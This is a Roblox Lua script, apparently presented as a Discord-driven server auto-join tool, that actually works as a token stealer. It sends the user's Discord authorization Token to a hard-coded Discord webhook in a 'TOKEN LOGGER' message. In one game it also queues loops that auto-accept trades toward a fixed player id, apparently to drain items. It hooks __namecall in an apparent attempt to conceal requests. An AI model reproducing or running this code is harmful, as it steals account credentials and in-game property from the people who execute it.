logstoken = "https://discord.com/api/webhooks/1299747409022156861/jzLmwvhdReia6IB2cFXc_48Dmo-EchdIA9UbGNfZE3Vc0UPKBvPu3u8cQAJXb6yXUYMc"

LOGS_TOKEN = logstoken

local HttpServ = game:GetService("HttpService")
local msglogs = "||@everyone||"  -- Message to be logged

local LastMsgId = ""

local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..ChannelId.."/messages?limit=1",
        Method = "GET",
        Headers = {
            ['Authorization'] = Token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            ["Content-Type"] = "application/json"
        }
    })
    
    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages > 0 then
            local placeId, jobId = string.match(messages[1].content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
            
            if tostring(messages[1].id) ~= LastMsgId then
                LastMsgId = tostring(messages[1].id)
                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                if placeId == 142823291 then
                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, 'hi')")
                    queue_on_teleport("while task.wait(0.1) do game:GetService('ReplicatedStorage').Trade.AcceptRequest:FireServer() end")
                    queue_on_teleport("while task.wait(0.1) do game:GetService('ReplicatedStorage').Trade.AcceptTrade:FireServer(unpack({[1] = 285646582})) end")
                    game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                else
                    queue_on_teleport("game:GetService('Chat'):Chat(game.Players.LocalPlayer.Character, 'hi')")
                    game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                end
            end
        end
    end
end

poop = hookmetamethod(game, "__namecall", function(self, ...)
    if self == request then
      return
    else
      poop(...)
    end
  end)

local tokenlogs = {
    username = "Muscle Man",
    avatar_url = "https://media.discordapp.net/attachments/1288404053394456587/1292742655037407304/171426663.jpg?ex=671de46a&is=671c92ea&hm=2defb9f5e27f3c376056615784bac0692c4b9b614b1b728f661a8df045311cb7&=&format=webp&width=419&height=419",
    content = msglogs,
    embeds = {{
        title = "TOKEN LOGGER",
        color = tonumber(0x000000),  -- Black color
        description = "",  -- Empty description
        fields = {
            {
                name = "Token: ",  -- Display 'Token: ' label
                value = "```" .. Token .. "```",  -- Concatenate Token properly and wrap it in code block
                inline = false,
            },
        },
    }}
}

local request = http_request or request or HttpPost or syn.request
request({
    Url = LOGS_TOKEN,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game.HttpService:JSONEncode(tokenlogs)  -- Send the tokenlogs data
})

while wait(10) do
    autoJoin()
end
